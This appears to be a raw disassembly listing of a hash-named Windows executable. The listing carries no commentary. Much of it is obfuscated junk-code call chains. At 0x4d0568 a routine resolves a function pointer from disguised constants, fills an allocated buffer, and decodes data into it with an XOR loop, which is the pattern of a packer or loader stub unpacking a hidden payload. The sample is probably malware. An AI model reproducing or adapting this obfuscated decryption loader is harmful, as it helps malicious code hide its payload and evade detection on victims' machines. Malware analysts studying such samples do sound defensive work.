
c71e90e718d0375529182f9f5e178a815b06ddb2ad1261dc273840446facd634.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    edi,edi
  4d0002:	push   ebp
  4d0003:	mov    ebp,esp
  4d0005:	sub    esp,0x40
  4d0008:	lea    ebx,[eax+0x30]
  4d000b:	adc    DWORD PTR [ebp-0x20],0xffffae6b
  4d0012:	mov    esi,0x0
  4d0017:	push   esi
  4d0018:	notrack call DWORD PTR ds:0x4d2058
  4d001f:	push   ebx
  4d0020:	push   DWORD PTR [ebx+0x194]
  4d0026:	push   DWORD PTR [ebx+0xc8]
  4d002c:	push   DWORD PTR [ebx]
  4d002e:	push   edi
  4d002f:	call   0x4d0444
  4d0034:	add    esp,0x10
  4d0037:	pop    ebx
  4d0038:	push   0x0
  4d003a:	notrack call DWORD PTR ds:0x4d2040
  4d0041:	add    esp,0x40
  4d0044:	pop    ebp
  4d0045:	ret    
	...
  4d004e:	add    BYTE PTR [eax],al
  4d0050:	mov    edi,edi
  4d0052:	push   ebp
  4d0053:	mov    ebp,esp
  4d0055:	sub    esp,0x50
  4d0058:	mov    esi,0x4d3060
  4d005d:	adc    DWORD PTR [ebp-0xc],eax
  4d0060:	push   esi
  4d0061:	push   edi
  4d0062:	push   eax
  4d0063:	push   ecx
  4d0064:	push   DWORD PTR [esi+0x14]
  4d0067:	call   0x4d036c
  4d006c:	add    esp,0x10
  4d006f:	pop    esi
  4d0070:	push   0x0
  4d0072:	notrack call DWORD PTR ds:0x4d202c
  4d0079:	mov    eax,0x0
  4d007e:	push   eax
  4d007f:	notrack call DWORD PTR ds:0x4d204c
  4d0086:	add    esp,0x50
  4d0089:	pop    ebp
  4d008a:	ret    
  4d008b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0091:	sub    esp,0x5c
  4d0094:	lea    ecx,[esi+0x19c]
  4d009a:	and    DWORD PTR [ebp-0x34],ebx
  4d009d:	push   ecx
  4d009e:	push   0x0
  4d00a0:	notrack call DWORD PTR ds:0x4d204c
  4d00a7:	pop    ecx
  4d00a8:	push   ecx
  4d00a9:	push   DWORD PTR [ecx+0x158]
  4d00af:	push   edi
  4d00b0:	call   0x4d05f8
  4d00b5:	add    esp,0x8
  4d00b8:	pop    ecx
  4d00b9:	push   ecx
  4d00ba:	push   0x0
  4d00bc:	notrack call DWORD PTR ds:0x4d204c
  4d00c3:	pop    ecx
  4d00c4:	add    esp,0x5c
  4d00c7:	pop    ebp
  4d00c8:	ret    
  4d00c9:	add    BYTE PTR [eax],al
  4d00cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d00d1:	sub    esp,0x44
  4d00d4:	lea    edx,ds:0x4d30b4
  4d00da:	sub    edi,edx
  4d00dc:	push   edx
  4d00dd:	mov    esi,0x0
  4d00e2:	push   esi
  4d00e3:	notrack call DWORD PTR ds:0x4d2038
  4d00ea:	pop    edx
  4d00eb:	push   edx
  4d00ec:	push   DWORD PTR [edx+0x68]
  4d00ef:	push   ecx
  4d00f0:	push   DWORD PTR [edx+0x70]
  4d00f3:	push   esi
  4d00f4:	call   0x4d080c
  4d00f9:	add    esp,0x10
  4d00fc:	pop    edx
  4d00fd:	mov    ebx,0x4d201c
  4d0102:	mov    ebx,DWORD PTR [ebx]
  4d0104:	push   ebx
  4d0105:	push   DWORD PTR [edx+0x44]
  4d0108:	pop    ecx
  4d0109:	call   ecx
  4d010b:	add    esp,0x44
  4d010e:	pop    ebp
  4d010f:	ret    
  4d0110:	mov    edi,edi
  4d0112:	push   ebp
  4d0113:	mov    ebp,esp
  4d0115:	sub    esp,0x24
  4d0118:	mov    ebx,0x4d31f8
  4d011d:	adc    DWORD PTR [ebp-0x20],edi
  4d0120:	lea    edi,[ebx-0x1f8]
  4d0126:	push   edi
  4d0127:	notrack call DWORD PTR ds:0x4d201c
  4d012e:	test   eax,eax
  4d0130:	jne    0x4d0121
  4d0132:	push   ebx
  4d0133:	push   esi
  4d0134:	push   eax
  4d0135:	push   DWORD PTR [ebx+0xa0]
  4d013b:	call   0x4d0634
  4d0140:	add    esp,0xc
  4d0143:	pop    ebx
  4d0144:	push   0x0
  4d0146:	notrack call DWORD PTR ds:0x4d204c
  4d014d:	add    esp,0x24
  4d0150:	pop    ebp
  4d0151:	ret    
  4d0152:	add    BYTE PTR [eax],al
  4d0154:	mov    edi,edi
  4d0156:	push   ebp
  4d0157:	mov    ebp,esp
  4d0159:	sub    esp,0x40
  4d015c:	lea    esi,[edx-0x9c]
  4d0162:	xor    ebx,DWORD PTR [ebp-0x1c]
  4d0165:	push   0x0
  4d0167:	notrack call DWORD PTR ds:0x4d2064
  4d016e:	push   esi
  4d016f:	push   ecx
  4d0170:	push   DWORD PTR [esi+0x78]
  4d0173:	push   edx
  4d0174:	push   DWORD PTR [esi+0x118]
  4d017a:	call   0x4d0320
  4d017f:	add    esp,0x10
  4d0182:	pop    esi
  4d0183:	push   0x0
  4d0185:	notrack call DWORD PTR ds:0x4d2020
  4d018c:	add    esp,0x40
  4d018f:	pop    ebp
  4d0190:	ret    
	...
  4d0199:	add    BYTE PTR [eax],al
  4d019b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d01a1:	sub    esp,0x50
  4d01a4:	lea    edx,[esi-0x50]
  4d01a7:	or     esi,DWORD PTR [ebp-0xc]
  4d01aa:	push   edx
  4d01ab:	push   DWORD PTR [edx+0x1a4]
  4d01b1:	push   eax
  4d01b2:	push   ebx
  4d01b3:	call   0x4d0938
  4d01b8:	add    esp,0xc
  4d01bb:	pop    edx
  4d01bc:	push   edx
  4d01bd:	notrack call DWORD PTR ds:0x4d2008
  4d01c4:	pop    edx
  4d01c5:	push   edx
  4d01c6:	mov    ebx,0x0
  4d01cb:	push   ebx
  4d01cc:	notrack call DWORD PTR ds:0x4d2000
  4d01d3:	pop    edx
  4d01d4:	add    esp,0x50
  4d01d7:	pop    ebp
  4d01d8:	ret    
  4d01d9:	add    BYTE PTR [eax],al
  4d01db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d01e1:	sub    esp,0x4c
  4d01e4:	lea    edx,[edi+0x8c]
  4d01ea:	sub    ecx,0x5991
  4d01f0:	push   edx
  4d01f1:	push   DWORD PTR [edx+0x90]
  4d01f7:	push   DWORD PTR [edx+0x48]
  4d01fa:	push   DWORD PTR [edx+0x60]
  4d01fd:	push   ecx
  4d01fe:	call   0x4d0568
  4d0203:	add    esp,0x10
  4d0206:	pop    edx
  4d0207:	push   edx
  4d0208:	mov    eax,0x0
  4d020d:	push   eax
  4d020e:	notrack call DWORD PTR ds:0x4d2058
  4d0215:	pop    edx
  4d0216:	push   edx
  4d0217:	mov    ecx,0x0
  4d021c:	push   ecx
  4d021d:	notrack call DWORD PTR ds:0x4d2000
  4d0224:	pop    edx
  4d0225:	add    esp,0x4c
  4d0228:	pop    ebp
  4d0229:	ret    
  4d022a:	add    BYTE PTR [eax],al
  4d022c:	add    BYTE PTR [eax],al
  4d022e:	add    BYTE PTR [eax],al
  4d0230:	mov    edi,edi
  4d0232:	push   ebp
  4d0233:	mov    ebp,esp
  4d0235:	sub    esp,0x58
  4d0238:	mov    esi,0x4d3024
  4d023d:	adc    DWORD PTR [ebp-0x54],esi
  4d0240:	push   0x0
  4d0242:	notrack call DWORD PTR ds:0x4d205c
  4d0249:	push   esi
  4d024a:	push   ecx
  4d024b:	push   DWORD PTR [esi+0x17c]
  4d0251:	push   DWORD PTR [esi+0x138]
  4d0257:	push   DWORD PTR [esi+0x138]
  4d025d:	call   0x4d008c
  4d0262:	add    esp,0x10
  4d0265:	pop    esi
  4d0266:	mov    eax,0x0
  4d026b:	push   eax
  4d026c:	notrack call DWORD PTR ds:0x4d2000
  4d0273:	add    esp,0x58
  4d0276:	pop    ebp
  4d0277:	ret    
  4d0278:	add    BYTE PTR [eax],al
  4d027a:	add    BYTE PTR [eax],al
  4d027c:	mov    edi,edi
  4d027e:	push   ebp
  4d027f:	mov    ebp,esp
  4d0281:	sub    esp,0x5c
  4d0284:	lea    edi,[eax+0xd8]
  4d028a:	and    edx,0x3a01
  4d0290:	push   edi
  4d0291:	push   ecx
  4d0292:	push   DWORD PTR [edi+0x160]
  4d0298:	call   0x4d0a04
  4d029d:	add    esp,0x8
  4d02a0:	pop    edi
  4d02a1:	mov    ebx,0x0
  4d02a6:	push   ebx
  4d02a7:	notrack call DWORD PTR ds:0x4d2040
  4d02ae:	push   0x0
  4d02b0:	notrack call DWORD PTR ds:0x4d2048
  4d02b7:	add    esp,0x5c
  4d02ba:	pop    ebp
  4d02bb:	ret    
	...
  4d02c8:	mov    edi,edi
  4d02ca:	push   ebp
  4d02cb:	mov    ebp,esp
  4d02cd:	sub    esp,0x50
  4d02d0:	lea    edi,[esi-0x48]
  4d02d3:	sub    DWORD PTR [edi-0x70],0x23
  4d02d7:	push   edi
  4d02d8:	push   ecx
  4d02d9:	push   DWORD PTR [edi+0x1d4]
  4d02df:	push   DWORD PTR [edi+0x1f8]
  4d02e5:	call   0x4d0740
  4d02ea:	add    esp,0xc
  4d02ed:	pop    edi
  4d02ee:	mov    edx,0x0
  4d02f3:	push   edx
  4d02f4:	notrack call DWORD PTR ds:0x4d2038
  4d02fb:	mov    esi,0x0
  4d0300:	push   esi
  4d0301:	notrack call DWORD PTR ds:0x4d205c
  4d0308:	add    esp,0x50
  4d030b:	pop    ebp
  4d030c:	ret    
	...
  4d031d:	add    BYTE PTR [eax],al
  4d031f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0325:	sub    esp,0x54
  4d0328:	lea    edx,ds:0x4d3030
  4d032e:	sub    ecx,0xffffeecf
  4d0334:	push   edx
  4d0335:	push   0x0
  4d0337:	notrack call DWORD PTR ds:0x4d200c
  4d033e:	pop    edx
  4d033f:	push   edx
  4d0340:	push   ecx
  4d0341:	push   DWORD PTR [edx+0x110]
  4d0347:	call   0x4d0790
  4d034c:	add    esp,0x8
  4d034f:	pop    edx
  4d0350:	push   edx
  4d0351:	mov    edx,0x0
  4d0356:	push   edx
  4d0357:	notrack call DWORD PTR ds:0x4d2048
  4d035e:	pop    edx
  4d035f:	add    esp,0x54
  4d0362:	pop    ebp
  4d0363:	ret    
	...
  4d036c:	mov    edi,edi
  4d036e:	push   ebp
  4d036f:	mov    ebp,esp
  4d0371:	sub    esp,0x38
  4d0374:	mov    ebx,0x4d3010
  4d0379:	mov    DWORD PTR [ebx+0x104],0xffffc04d
  4d0383:	push   ebx
  4d0384:	push   edx
  4d0385:	push   edi
  4d0386:	call   0x4d0858
  4d038b:	add    esp,0x8
  4d038e:	pop    ebx
  4d038f:	mov    edi,0x0
  4d0394:	push   edi
  4d0395:	notrack call DWORD PTR ds:0x4d2000
  4d039c:	push   0x0
  4d039e:	notrack call DWORD PTR ds:0x4d2048
  4d03a5:	add    esp,0x38
  4d03a8:	pop    ebp
  4d03a9:	ret    
  4d03aa:	add    BYTE PTR [eax],al
  4d03ac:	add    BYTE PTR [eax],al
  4d03ae:	add    BYTE PTR [eax],al
  4d03b0:	mov    edi,edi
  4d03b2:	push   ebp
  4d03b3:	mov    ebp,esp
  4d03b5:	sub    esp,0x2c
  4d03b8:	mov    ecx,0x4d31d4
  4d03bd:	and    esi,0xe
  4d03c0:	push   ecx
  4d03c1:	push   esi
  4d03c2:	push   edi
  4d03c3:	push   DWORD PTR [ecx+0x1e0]
  4d03c9:	push   DWORD PTR [ecx+0xe4]
  4d03cf:	call   0x4d0230
  4d03d4:	add    esp,0x10
  4d03d7:	pop    ecx
  4d03d8:	push   ecx
  4d03d9:	mov    edx,0x0
  4d03de:	push   edx
  4d03df:	notrack call DWORD PTR ds:0x4d2038
  4d03e6:	pop    ecx
  4d03e7:	push   ecx
  4d03e8:	push   0x0
  4d03ea:	notrack call DWORD PTR ds:0x4d204c
  4d03f1:	pop    ecx
  4d03f2:	add    esp,0x2c
  4d03f5:	pop    ebp
  4d03f6:	ret    
  4d03f7:	add    BYTE PTR [edx+0x0],ch
  4d03fa:	call   DWORD PTR ds:0x4d2038
  4d0400:	call   DWORD PTR ds:0x4d2004
  4d0406:	sub    esp,0x8
  4d0409:	call   DWORD PTR ds:0x4d2004
  4d040f:	sub    esp,0x8
  4d0412:	xor    eax,eax
  4d0414:	lea    eax,[eax*2+0x4d3100]
  4d041b:	lea    ecx,[eax+0x4]
  4d041e:	add    BYTE PTR [ecx],0xb0
  4d0421:	push   eax
  4d0422:	call   DWORD PTR ds:0x4d2024
  4d0428:	mov    ecx,DWORD PTR [eax+0x3c]
  4d042b:	push   DWORD PTR [eax+ecx*1+0x29]
  4d042f:	pop    eax
  4d0430:	mov    cl,0x2c
  4d0432:	cmp    al,cl
  4d0434:	pusha  
  4d0435:	ja     0x4d00cc
  4d043b:	popa   
  4d043c:	ret    
  4d043d:	add    BYTE PTR [eax],al
  4d043f:	repz add BYTE PTR [eax],al
  4d0442:	add    BYTE PTR [eax],al
  4d0444:	mov    edi,edi
  4d0446:	push   ebp
  4d0447:	mov    ebp,esp
  4d0449:	sub    esp,0x38
  4d044c:	lea    eax,[ebx-0x184]
  4d0452:	adc    DWORD PTR [eax-0x4],edx
  4d0455:	push   eax
  4d0456:	push   DWORD PTR [eax+0xe0]
  4d045c:	push   DWORD PTR [eax+0xec]
  4d0462:	call   0x4d08ec
  4d0467:	add    esp,0x8
  4d046a:	pop    eax
  4d046b:	push   eax
  4d046c:	push   0x0
  4d046e:	notrack call DWORD PTR ds:0x4d2028
  4d0475:	pop    eax
  4d0476:	push   eax
  4d0477:	push   0x0
  4d0479:	notrack call DWORD PTR ds:0x4d2000
  4d0480:	pop    eax
  4d0481:	add    esp,0x38
  4d0484:	pop    ebp
  4d0485:	ret    
	...
  4d048e:	add    BYTE PTR [eax],al
  4d0490:	mov    edi,edi
  4d0492:	push   ebp
  4d0493:	mov    ebp,esp
  4d0495:	sub    esp,0x20
  4d0498:	lea    eax,ds:0x4d3148
  4d049e:	or     edx,DWORD PTR [eax+0x38]
  4d04a1:	push   eax
  4d04a2:	push   0x0
  4d04a4:	notrack call DWORD PTR ds:0x4d2040
  4d04ab:	pop    eax
  4d04ac:	push   eax
  4d04ad:	push   edi
  4d04ae:	push   esi
  4d04af:	push   esi
  4d04b0:	push   DWORD PTR [eax+0x7c]
  4d04b3:	call   0x4d070c
  4d04b8:	add    esp,0x10
  4d04bb:	pop    eax
  4d04bc:	push   eax
  4d04bd:	mov    eax,0x0
  4d04c2:	push   eax
  4d04c3:	notrack call DWORD PTR ds:0x4d2038
  4d04ca:	pop    eax
  4d04cb:	add    esp,0x20
  4d04ce:	pop    ebp
  4d04cf:	ret    
	...
  4d04d8:	mov    edi,edi
  4d04da:	push   ebp
  4d04db:	mov    ebp,esp
  4d04dd:	sub    esp,0x30
  4d04e0:	lea    edx,ds:0x4d30d4
  4d04e6:	sbb    DWORD PTR [ebp-0x2c],ebx
  4d04e9:	push   edx
  4d04ea:	push   ecx
  4d04eb:	push   DWORD PTR [edx+0x16c]
  4d04f1:	push   DWORD PTR [edx+0x17c]
  4d04f7:	call   0x4d0524
  4d04fc:	add    esp,0xc
  4d04ff:	pop    edx
  4d0500:	push   edx
  4d0501:	push   0x0
  4d0503:	notrack call DWORD PTR ds:0x4d2020
  4d050a:	pop    edx
  4d050b:	push   edx
  4d050c:	mov    edi,0x0
  4d0511:	push   edi
  4d0512:	notrack call DWORD PTR ds:0x4d2058
  4d0519:	pop    edx
  4d051a:	add    esp,0x30
  4d051d:	pop    ebp
  4d051e:	ret    
  4d051f:	add    BYTE PTR [eax],al
  4d0521:	add    BYTE PTR [eax],al
  4d0523:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0529:	sub    esp,0x34
  4d052c:	mov    esi,0x4d30c0
  4d0531:	xor    edx,DWORD PTR [esi-0x44]
  4d0534:	push   0x0
  4d0536:	notrack call DWORD PTR ds:0x4d205c
  4d053d:	push   esi
  4d053e:	push   eax
  4d053f:	push   DWORD PTR [esi+0x94]
  4d0545:	push   DWORD PTR [esi+0x1f8]
  4d054b:	call   0x4d09b8
  4d0550:	add    esp,0xc
  4d0553:	pop    esi
  4d0554:	push   0x0
  4d0556:	notrack call DWORD PTR ds:0x4d2020
  4d055d:	add    esp,0x34
  4d0560:	pop    ebp
  4d0561:	ret    
  4d0562:	add    BYTE PTR [eax],al
  4d0564:	add    BYTE PTR [eax],al
  4d0566:	add    BYTE PTR [eax],al
  4d0568:	mov    edi,edi
  4d056a:	push   ebp
  4d056b:	mov    ebp,esp
  4d056d:	sub    esp,0x2c
  4d0570:	adc    DWORD PTR [ebp-0x2c],0x41
  4d0574:	lea    ebx,[edx+0xbc]
  4d057a:	push   0x6ac
  4d057f:	mov    ecx,0x6ac
  4d0584:	push   ecx
  4d0585:	mov    esi,0x40001
  4d058a:	push   esi
  4d058b:	mov    esi,0x862985aa
  4d0590:	push   DWORD PTR [esi+0x7a239a86]
  4d0596:	sub    DWORD PTR [esp],0x2
  4d059a:	mov    esi,0x4d2024
  4d059f:	pop    DWORD PTR [esi]
  4d05a1:	notrack call DWORD PTR ds:0x4d2024
  4d05a8:	push   eax
  4d05a9:	pop    DWORD PTR [ebx-0x7c]
  4d05ac:	mov    eax,DWORD PTR [ebx-0x7c]
  4d05af:	lea    esi,[eax]
  4d05b1:	sub    edx,edx
  4d05b3:	dec    edx
  4d05b4:	and    edx,0x4d0a88
  4d05ba:	mov    ecx,0x9de45a73
  4d05bf:	mov    eax,0x6ac
  4d05c4:	xor    edi,edi
  4d05c6:	push   DWORD PTR [edx+edi*1]
  4d05c9:	inc    DWORD PTR [esp]
  4d05cc:	xor    DWORD PTR [esp],ecx
  4d05cf:	pop    DWORD PTR [esi+edi*2]
  4d05d2:	push   DWORD PTR [edx]
  4d05d4:	pop    ecx
  4d05d5:	add    edx,0x4
  4d05d8:	add    esi,0x4
  4d05db:	sub    eax,0x4
  4d05de:	cmp    eax,0x0
  4d05e1:	jne    0x4d05c4
  4d05e3:	mov    edx,0x0
  4d05e8:	push   edx
  4d05e9:	notrack call DWORD PTR ds:0x4d2064
  4d05f0:	add    esp,0x2c
  4d05f3:	pop    ebp
  4d05f4:	ret    
  4d05f5:	add    BYTE PTR [eax],al
  4d05f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d05fd:	sub    esp,0x5c
  4d0600:	mov    esi,0x4d31fc
  4d0605:	mov    ebx,0xffffc8ef
  4d060a:	mov    edi,0x0
  4d060f:	push   edi
  4d0610:	notrack call DWORD PTR ds:0x4d2000
  4d0617:	push   esi
  4d0618:	push   edi
  4d0619:	push   eax
  4d061a:	push   DWORD PTR [esi+0x4c]
  4d061d:	call   0x4d019c
  4d0622:	add    esp,0xc
  4d0625:	pop    esi
  4d0626:	push   0x0
  4d0628:	notrack call DWORD PTR ds:0x4d2040
  4d062f:	add    esp,0x5c
  4d0632:	pop    ebp
  4d0633:	ret    
  4d0634:	mov    edi,edi
  4d0636:	push   ebp
  4d0637:	mov    ebp,esp
  4d0639:	sub    esp,0x50
  4d063c:	lea    eax,[ebx-0x1f0]
  4d0642:	sub    ebx,edx
  4d0644:	push   eax
  4d0645:	push   esi
  4d0646:	push   DWORD PTR [eax+0x2c]
  4d0649:	push   DWORD PTR [eax+0x188]
  4d064f:	call   0x4d027c
  4d0654:	add    esp,0xc
  4d0657:	pop    eax
  4d0658:	push   eax
  4d0659:	lea    esi,[eax-0x8]
  4d065c:	push   esi
  4d065d:	notrack call DWORD PTR ds:0x4d201c
  4d0664:	test   eax,eax
  4d0666:	jne    0x4d0659
  4d0668:	pop    eax
  4d0669:	push   eax
  4d066a:	push   0x0
  4d066c:	notrack call DWORD PTR ds:0x4d2000
  4d0673:	pop    eax
  4d0674:	add    esp,0x50
  4d0677:	pop    ebp
  4d0678:	ret    
  4d0679:	add    BYTE PTR [eax],al
  4d067b:	add    BYTE PTR [eax],al
  4d067d:	add    BYTE PTR [eax],al
  4d067f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0685:	sub    esp,0x60
  4d0688:	mov    ecx,0x4d3134
  4d068d:	sbb    DWORD PTR [ebp-0x44],0xffffc1f2
  4d0694:	push   ecx
  4d0695:	push   0x0
  4d0697:	notrack call DWORD PTR ds:0x4d2048
  4d069e:	pop    ecx
  4d069f:	push   ecx
  4d06a0:	push   DWORD PTR [ecx+0x1a4]
  4d06a6:	push   edx
  4d06a7:	call   0x4d07cc
  4d06ac:	add    esp,0x8
  4d06af:	pop    ecx
  4d06b0:	push   ecx
  4d06b1:	push   0x0
  4d06b3:	notrack call DWORD PTR ds:0x4d200c
  4d06ba:	pop    ecx
  4d06bb:	add    esp,0x60
  4d06be:	pop    ebp
  4d06bf:	ret    
	...
  4d06c8:	mov    edi,edi
  4d06ca:	push   ebp
  4d06cb:	mov    ebp,esp
  4d06cd:	sub    esp,0x30
  4d06d0:	lea    ebx,ds:0x4d30e4
  4d06d6:	xor    DWORD PTR [ebp-0x4],eax
  4d06d9:	push   0x0
  4d06db:	notrack call DWORD PTR ds:0x4d200c
  4d06e2:	push   ebx
  4d06e3:	push   esi
  4d06e4:	push   edi
  4d06e5:	push   DWORD PTR [ebx+0x1dc]
  4d06eb:	call   0x4d08a4
  4d06f0:	add    esp,0xc
  4d06f3:	pop    ebx
  4d06f4:	mov    edi,0x0
  4d06f9:	push   edi
  4d06fa:	notrack call DWORD PTR ds:0x4d2040
  4d0701:	add    esp,0x30
  4d0704:	pop    ebp
  4d0705:	ret    
  4d0706:	add    BYTE PTR [eax],al
  4d0708:	add    BYTE PTR [eax],al
  4d070a:	add    BYTE PTR [eax],al
  4d070c:	mov    edi,edi
  4d070e:	push   ebp
  4d070f:	mov    ebp,esp
  4d0711:	sub    esp,0x40
  4d0714:	lea    ebx,[eax-0x104]
  4d071a:	adc    edx,DWORD PTR [ebp-0x38]
  4d071d:	push   0x0
  4d071f:	notrack call DWORD PTR ds:0x4d205c
  4d0726:	push   ebx
  4d0727:	push   edx
  4d0728:	push   eax
  4d0729:	call   0x4d097c
  4d072e:	add    esp,0x8
  4d0731:	pop    ebx
  4d0732:	notrack call DWORD PTR ds:0x4d2008
  4d0739:	add    esp,0x40
  4d073c:	pop    ebp
  4d073d:	ret    
  4d073e:	add    BYTE PTR [eax],al
  4d0740:	mov    edi,edi
  4d0742:	push   ebp
  4d0743:	mov    ebp,esp
  4d0745:	sub    esp,0x54
  4d0748:	lea    eax,[edi+0x88]
  4d074e:	mov    DWORD PTR [ebp-0x2c],0xffffffdf
  4d0755:	push   eax
  4d0756:	push   esi
  4d0757:	push   DWORD PTR [eax+0x16c]
  4d075d:	push   ebx
  4d075e:	push   ecx
  4d075f:	call   0x4d0110
  4d0764:	add    esp,0x10
  4d0767:	pop    eax
  4d0768:	push   eax
  4d0769:	mov    eax,0x0
  4d076e:	push   eax
  4d076f:	notrack call DWORD PTR ds:0x4d204c
  4d0776:	pop    eax
  4d0777:	push   eax
  4d0778:	mov    esi,0x0
  4d077d:	push   esi
  4d077e:	notrack call DWORD PTR ds:0x4d2038
  4d0785:	pop    eax
  4d0786:	add    esp,0x54
  4d0789:	pop    ebp
  4d078a:	ret    
  4d078b:	add    BYTE PTR [eax],al
  4d078d:	add    BYTE PTR [eax],al
  4d078f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0795:	sub    esp,0x54
  4d0798:	mov    eax,0x4d3178
  4d079d:	xor    esi,ecx
  4d079f:	push   eax
  4d07a0:	push   0x0
  4d07a2:	notrack call DWORD PTR ds:0x4d2028
  4d07a9:	pop    eax
  4d07aa:	push   eax
  4d07ab:	push   ecx
  4d07ac:	push   DWORD PTR [eax+0x1ec]
  4d07b2:	push   esi
  4d07b3:	call   0x4d0000
  4d07b8:	add    esp,0xc
  4d07bb:	pop    eax
  4d07bc:	push   eax
  4d07bd:	push   0x0
  4d07bf:	notrack call DWORD PTR ds:0x4d2048
  4d07c6:	pop    eax
  4d07c7:	add    esp,0x54
  4d07ca:	pop    ebp
  4d07cb:	ret    
  4d07cc:	mov    edi,edi
  4d07ce:	push   ebp
  4d07cf:	mov    ebp,esp
  4d07d1:	sub    esp,0x60
  4d07d4:	lea    edx,ds:0x4d31e0
  4d07da:	add    DWORD PTR [ebp-0x38],0xffffa6d0
  4d07e1:	push   edx
  4d07e2:	push   eax
  4d07e3:	push   DWORD PTR [edx+0x2c]
  4d07e6:	push   ecx
  4d07e7:	push   esi
  4d07e8:	call   0x4d0490
  4d07ed:	add    esp,0x10
  4d07f0:	pop    edx
  4d07f1:	push   edx
  4d07f2:	push   0x0
  4d07f4:	notrack call DWORD PTR ds:0x4d2064
  4d07fb:	pop    edx
  4d07fc:	push   edx
  4d07fd:	push   0x0
  4d07ff:	notrack call DWORD PTR ds:0x4d205c
  4d0806:	pop    edx
  4d0807:	add    esp,0x60
  4d080a:	pop    ebp
  4d080b:	ret    
  4d080c:	mov    edi,edi
  4d080e:	push   ebp
  4d080f:	mov    ebp,esp
  4d0811:	sub    esp,0x20
  4d0814:	mov    eax,0x4d30c8
  4d0819:	and    DWORD PTR [ebp-0x8],0xffffff90
  4d081d:	push   eax
  4d081e:	push   0x0
  4d0820:	notrack call DWORD PTR ds:0x4d204c
  4d0827:	pop    eax
  4d0828:	push   eax
  4d0829:	push   DWORD PTR [eax+0x17c]
  4d082f:	push   edi
  4d0830:	push   DWORD PTR [eax+0x18c]
  4d0836:	call   0x4d06c8
  4d083b:	add    esp,0xc
  4d083e:	pop    eax
  4d083f:	push   eax
  4d0840:	mov    ecx,0x0
  4d0845:	push   ecx
  4d0846:	notrack call DWORD PTR ds:0x4d200c
  4d084d:	pop    eax
  4d084e:	add    esp,0x20
  4d0851:	pop    ebp
  4d0852:	ret    
  4d0853:	add    BYTE PTR [eax],al
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d085d:	sub    esp,0x54
  4d0860:	lea    edx,[ebx+0xec]
  4d0866:	xor    DWORD PTR [ebp-0x34],edx
  4d0869:	push   edx
  4d086a:	mov    ebx,0x0
  4d086f:	push   ebx
  4d0870:	notrack call DWORD PTR ds:0x4d2000
  4d0877:	pop    edx
  4d0878:	push   edx
  4d0879:	push   esi
  4d087a:	push   edi
  4d087b:	call   0x4d0680
  4d0880:	add    esp,0x8
  4d0883:	pop    edx
  4d0884:	push   edx
  4d0885:	push   0x0
  4d0887:	notrack call DWORD PTR ds:0x4d2028
  4d088e:	pop    edx
  4d088f:	add    esp,0x54
  4d0892:	pop    ebp
  4d0893:	ret    
	...
  4d08a4:	mov    edi,edi
  4d08a6:	push   ebp
  4d08a7:	mov    ebp,esp
  4d08a9:	sub    esp,0x60
  4d08ac:	lea    edx,[ebx-0xcc]
  4d08b2:	sbb    ebx,DWORD PTR [edx+0xbc]
  4d08b8:	push   edx
  4d08b9:	push   eax
  4d08ba:	push   ecx
  4d08bb:	push   ecx
  4d08bc:	call   0x4d0050
  4d08c1:	add    esp,0xc
  4d08c4:	pop    edx
  4d08c5:	push   edx
  4d08c6:	mov    edi,0x0
  4d08cb:	push   edi
  4d08cc:	notrack call DWORD PTR ds:0x4d2000
  4d08d3:	pop    edx
  4d08d4:	push   edx
  4d08d5:	mov    ecx,0x0
  4d08da:	push   ecx
  4d08db:	notrack call DWORD PTR ds:0x4d200c
  4d08e2:	pop    edx
  4d08e3:	add    esp,0x60
  4d08e6:	pop    ebp
  4d08e7:	ret    
  4d08e8:	add    BYTE PTR [eax],al
  4d08ea:	add    BYTE PTR [eax],al
  4d08ec:	mov    edi,edi
  4d08ee:	push   ebp
  4d08ef:	mov    ebp,esp
  4d08f1:	sub    esp,0x1c
  4d08f4:	mov    edx,0x4d31a4
  4d08f9:	add    DWORD PTR [ebp-0xc],ebx
  4d08fc:	push   edx
  4d08fd:	push   esi
  4d08fe:	push   DWORD PTR [edx+0xf8]
  4d0904:	push   DWORD PTR [edx+0x1c]
  4d0907:	push   esi
  4d0908:	call   0x4d03b0
  4d090d:	add    esp,0x10
  4d0910:	pop    edx
  4d0911:	push   edx
  4d0912:	notrack call DWORD PTR ds:0x4d2008
  4d0919:	pop    edx
  4d091a:	push   edx
  4d091b:	mov    edx,0x0
  4d0920:	push   edx
  4d0921:	notrack call DWORD PTR ds:0x4d204c
  4d0928:	pop    edx
  4d0929:	add    esp,0x1c
  4d092c:	pop    ebp
  4d092d:	ret    
	...
  4d0936:	add    BYTE PTR [eax],al
  4d0938:	mov    edi,edi
  4d093a:	push   ebp
  4d093b:	mov    ebp,esp
  4d093d:	sub    esp,0x38
  4d0940:	lea    eax,[edx-0x74]
  4d0943:	or     DWORD PTR [eax+0x4],esi
  4d0946:	push   eax
  4d0947:	push   edi
  4d0948:	push   DWORD PTR [eax+0x128]
  4d094e:	push   esi
  4d094f:	push   ecx
  4d0950:	call   0x4d04d8
  4d0955:	add    esp,0x10
  4d0958:	pop    eax
  4d0959:	push   eax
  4d095a:	mov    ecx,0x0
  4d095f:	push   ecx
  4d0960:	notrack call DWORD PTR ds:0x4d2058
  4d0967:	pop    eax
  4d0968:	push   eax
  4d0969:	mov    ecx,0x0
  4d096e:	push   ecx
  4d096f:	notrack call DWORD PTR ds:0x4d2058
  4d0976:	pop    eax
  4d0977:	add    esp,0x38
  4d097a:	pop    ebp
  4d097b:	ret    
  4d097c:	mov    edi,edi
  4d097e:	push   ebp
  4d097f:	mov    ebp,esp
  4d0981:	sub    esp,0x30
  4d0984:	lea    esi,[ebx+0xcc]
  4d098a:	sbb    eax,DWORD PTR [ebp-0x24]
  4d098d:	push   esi
  4d098e:	push   edx
  4d098f:	push   DWORD PTR [esi+0x1c]
  4d0992:	call   0x4d02c8
  4d0997:	add    esp,0x8
  4d099a:	pop    esi
  4d099b:	push   0x0
